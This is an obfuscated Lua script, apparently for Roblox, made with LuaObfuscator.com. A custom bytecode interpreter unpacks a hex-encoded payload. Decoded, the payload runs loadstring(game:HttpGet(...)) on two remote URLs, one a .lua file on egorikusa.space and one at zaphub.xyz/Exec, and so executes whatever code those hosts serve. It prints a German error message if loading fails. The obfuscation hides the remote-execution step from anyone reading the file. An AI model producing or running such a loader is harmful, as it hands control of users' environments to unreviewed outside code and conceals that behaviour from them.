--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.6) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==79) then local v80=0;while true do if (v80==0) then v19=v0(v3(v30,1,1));return "";end end else local v81=0;local v82;while true do if (v81==0) then v82=v2(v0(v30,16));if v19 then local v100=v5(v82,v19);v19=nil;return v100;else return v82;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v83=927 -(214 + 713) ;local v84;while true do if (v83==(0 -0)) then v84=(v31/(((958 -(892 + 65)) + 1)^(v32-(2 -1))))%(((3 + 0) -1)^(((v33-(1 + 0)) -(v32-(1 -0))) + (2 -(2 -1)))) ;return v84-(v84%(1271 -(226 + (1929 -885)))) ;end end else local v85=(8 -6)^(v32-((138 + 482) -(555 + 64))) ;return (((v31%(v85 + v85))>=v85) and (932 -(857 + 74))) or (568 -((673 -306) + 201)) ;end end local function v21() local v34=350 -(87 + (645 -382)) ;local v35;while true do if (v34==(181 -(67 + 113))) then return v35;end if (v34==(0 + 0)) then v35=v1(v16,v18,v18);v18=v18 + 1 ;v34=1;end end end local function v22() local v36,v37=v1(v16,v18,v18 + 2 + 0 );v18=v18 + 2 ;return (v37 * (1017 -761)) + v36 ;end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + 3 );v18=v18 + (956 -(802 + 150)) ;return (v41 * (45169940 -28392724)) + (v40 * (118879 -53343)) + (v39 * 256) + v38 ;end local function v24() local v42=v23();local v43=v23();local v44=1 + 0 ;local v45=(v20(v43,998 -(915 + 82) ,(46 + 10) -36 ) * ((2 + 0)^(41 -9))) + v42 ;local v46=v20(v43,21,1218 -(1069 + 118) );local v47=((v20(v43,72 -(812 -(201 + 571)) )==(1 -0)) and  -1) or (1 + 0) ;if (v46==(0 -0)) then if (v45==(0 + 0)) then return v47 * (791 -(368 + 423)) ;else local v88=0 -0 ;while true do if (v88==(18 -(10 + 8))) then v46=3 -2 ;v44=442 -(416 + 26) ;break;end end end elseif (v46==(6535 -4488)) then return ((v45==(0 + (1138 -(116 + 1022)))) and (v47 * (((4 -3) -0)/(438 -(145 + 293))))) or (v47 * NaN) ;end return v8(v47,v46-(1453 -(44 + 386)) ) * (v44 + (v45/((1488 -(586 + 412 + 488))^(17 + 35)))) ;end local function v25(v48) local v49=(0 -0) -0 ;local v50;local v51;while true do if (v49==((0 + 0) -0)) then v50=nil;if  not v48 then local v95=0;while true do if (v95==(859 -(814 + 45))) then v48=v23();if (v48==(0 -0)) then return "";end break;end end end v49=1 + 0 ;end if (v49==(2 + 1)) then return v6(v51);end if (v49==(1 + 1)) then v51={};for v89=1748 -(760 + 987) , #v50 do v51[v89]=v2(v1(v3(v50,v89,v89)));end v49=(1505 + 411) -(1789 + 124) ;end if (v49==(886 -(261 + 624))) then v50=v3(v16,v18,(v18 + v48) -(1 -0) );v18=v18 + v48 ;v49=5 -3 ;end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=0 + 0 ;local v53;local v54;local v55;local v56;local v57;local v58;while true do local v65=0 -0 ;while true do if (v65~=(935 -(39 + 896))) then else if (v52~=2) then else for v101=1 -0 ,v23() do local v102=0 -0 ;local v103;local v104;while true do if (v102==(2 -1)) then while true do if (v103==0) then v104=v21();if (v20(v104,1 + 0 ,1 + 0 )==(396 -(115 + 281))) then local v133=0 -0 ;local v134;local v135;local v136;while true do if (v133~=(1 + 0)) then else local v167=572 -(426 + 146) ;while true do if (v167~=(0 -0)) then else v136={v22(),v22(),nil,nil};if (v134==(1456 -(282 + 1174))) then local v176=0 -0 ;local v177;while true do if (v176==(0 -0)) then v177=0 + 0 ;while true do if (0==v177) then v136[3]=v22();v136[4]=v22();break;end end break;end end elseif (v134==1) then v136[8 -5 ]=v23();elseif (v134==2) then v136[3]=v23() -((1253 -(721 + 530))^(301 -(134 + 151))) ;elseif (v134~=(1668 -(970 + 695))) then else local v182=0 -0 ;local v183;while true do if (v182~=(700 -(271 + 429))) then else v183=0;while true do if (v183==0) then v136[3 + 0 ]=v23() -((1992 -(582 + 1408))^(1102 -(461 + 625))) ;v136[13 -9 ]=v22();break;end end break;end end end v167=1;end if (v167==(1289 -(993 + 295))) then v133=1 + 1 ;break;end end end if (v133==(1171 -(418 + 753))) then local v168=0;while true do if (v168==(0 -0)) then v134=v20(v104,2,3);v135=v20(v104,15 -11 ,1830 -(1195 + 629) );v168=1;end if (v168==1) then v133=1 -0 ;break;end end end if (v133==(1 + 2)) then if (v20(v135,244 -(187 + 54) ,532 -(406 + 123) )~=(781 -(162 + 618))) then else v136[3 + 1 ]=v58[v136[3 + 1 ]];end v53[v101]=v136;break;end if (v133~=(3 -1)) then else if (v20(v135,1 -0 ,1 + 0 )==(1637 -(1373 + 263))) then v136[1002 -(451 + 549) ]=v58[v136[1 + 1 ]];end if (v20(v135,2,1147 -(466 + 679) )==(1 -0)) then v136[8 -5 ]=v58[v136[1903 -(106 + 1794) ]];end v133=4 -1 ;end end end break;end end break;end if ((1384 -(746 + 638))~=v102) then else v103=0;v104=nil;v102=1 + 0 ;end end end for v105=1 -0 ,v23() do v54[v105-(1 + 0) ]=v28();end return v56;end if ((342 -(218 + 123))==v52) then v57=v23();v58={};for v107=1582 -(1535 + 46) ,v57 do local v108=114 -(4 + 110) ;local v109;local v110;while true do if (v108==(584 -(57 + 527))) then local v111=0 + 0 ;while true do if (1==v111) then v108=1;break;end if (v111==(1427 -(41 + 1386))) then v109=v21();v110=nil;v111=104 -(17 + 86) ;end end end if (v108~=(1 + 0)) then else if (v109==1) then v110=v21()~=0 ;elseif (v109==2) then v110=v24();elseif (v109==3) then v110=v25();end v58[v107]=v110;break;end end end v56[6 -3 ]=v21();v52=1 + 1 ;end v65=561 -(306 + 254) ;end if (v65==(2 -1)) then if (v52~=0) then else local v99=0 + 0 ;while true do if ((0 -0)~=v99) then else v53={};v54={};v99=3 -2 ;end if (v99==1) then v55={};v56={v53,v54,nil,v55};v99=1469 -(899 + 568) ;end if (v99==(2 + 0)) then v52=1258 -(1043 + 214) ;break;end end end break;end end end end local function v29(v59,v60,v61) local v62=v59[1];local v63=v59[2];local v64=v59[3];return function(...) local v66=v62;local v67=v63;local v68=v64;local v69=v27;local v70=1;local v71= -1;local v72={};local v73={...};local v74=v12("#",...) -1 ;local v75={};local v76={};for v86=0,v74 do if (v86>=v68) then v72[v86-v68 ]=v73[v86 + 1 ];else v76[v86]=v73[v86 + 1 ];end end local v77=(v74-v68) + 1 ;local v78;local v79;while true do local v87=0;while true do if (v87==1) then if (v79<=6) then if (v79<=2) then if (v79<=0) then v76[v78[2]]=v76[v78[3]][v78[4]];elseif (v79==1) then v70=v78[3];else local v116=0;local v117;while true do if (v116==0) then v117=v78[2];v76[v117](v76[v117 + 1 ]);break;end end end elseif (v79<=4) then if (v79>3) then for v131=v78[2],v78[3] do v76[v131]=nil;end else local v118=0;local v119;while true do if (v118==7) then v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v76[v78[3]];break;end if (5==v118) then v76[v78[2]]=v61[v78[3]];v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v76[v78[3]];v118=6;end if (v118==1) then v76[v78[2]]=v78[3];v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v76[v78[3]];v118=2;end if (v118==4) then v78=v66[v70];v76[v78[2]]=v76[v78[3]];v70=v70 + 1 ;v78=v66[v70];v118=5;end if (v118==0) then v119=nil;v76[v78[2]]=v76[v78[3]][v78[4]];v70=v70 + 1 ;v78=v66[v70];v118=1;end if (3==v118) then v78=v66[v70];v119=v78[2];v76[v119]=v76[v119](v13(v76,v119 + 1 ,v78[3]));v70=v70 + 1 ;v118=4;end if (v118==2) then v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v76[v78[3]];v70=v70 + 1 ;v118=3;end if (v118==6) then v70=v70 + 1 ;v78=v66[v70];v119=v78[2];v76[v119]=v76[v119](v76[v119 + 1 ]);v118=7;end end end elseif (v79==5) then local v120=0;local v121;while true do if (v120==0) then v121=v78[2];v76[v121]=v76[v121](v76[v121 + 1 ]);break;end end else v76[v78[2]]=v61[v78[3]];end elseif (v79<=9) then if (v79<=7) then if v76[v78[2]] then v70=v70 + 1 ;else v70=v78[3];end elseif (v79==8) then if (v76[v78[2]]==v78[4]) then v70=v70 + 1 ;else v70=v78[3];end else v76[v78[2]]=v76[v78[3]];end elseif (v79<=11) then if (v79==10) then local v127=v78[2];v76[v127]=v76[v127](v13(v76,v127 + 1 ,v78[3]));else v76[v78[2]]=v78[3];end elseif (v79==12) then v76[v78[2]]();else do return;end end v70=v70 + 1 ;break;end if (v87==0) then v78=v66[v70];v79=v78[1];v87=1;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!0B3O00028O0003343O00682O7470733A2O2F65676F72696B7573612E73706163652F61333137623536326330373334352O6263656263346436312E6C7561031B3O00682O7470733A2O2F3O772E7A61706875622E78797A2F45786563026O00F03F03063O00737472696E6703063O00666F726D6174034A3O004O206C6F6164737472696E672867616D653A482O747047657428272573272O2928290A4O206C6F6164737472696E672867616D653A482O747047657428272573272O2928290A030A3O006C6F6164737472696E67027O004003053O007072696E74032A3O004665686C6572206265696D204C6164656E20646573206B6F6D62696E69657274656E20536B726970747300223O00120B3O00014O0004000100043O0026083O0007000100010004013O0007000100120B000100023O00120B000200033O00120B3O00043O0026083O0015000100040004013O00150001001206000500053O00200300050005000600122O000600076O000700016O000800026O0005000800024O000300053O00122O000500086O000600036O0005000200024O000400053O00120B3O00093O0026083O0002000100090004013O000200010006070004001C00013O0004013O001C00012O0009000500044O000C0005000100010004013O002100010012060005000A3O00120B0006000B4O00020005000200010004013O002100010004013O000200012O000D3O00017O00",v9(),...);